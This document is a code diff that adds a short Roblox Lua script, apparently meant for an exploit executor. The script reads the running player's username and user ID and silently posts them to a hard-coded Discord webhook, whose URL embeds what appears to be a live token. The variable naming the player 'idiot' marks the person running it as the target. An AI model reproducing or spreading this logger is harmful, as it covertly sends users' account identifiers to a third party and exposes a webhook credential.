@@ -1,0 +1,12 @@
+local idiot = game:GetService("Players").LocalPlayer
+local response = http.request(
+
+    {
+        Url = 'https://discord.com/api/webhooks/1124806229538123828/plMsSIshcA4XVUaoYGLSLV03wHoG4rv1YV6dPUyzkocP_4moDVpEs2I41mgCkfINnxpU',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = idiot.Name .. idiot.UserId})
+    }
+);
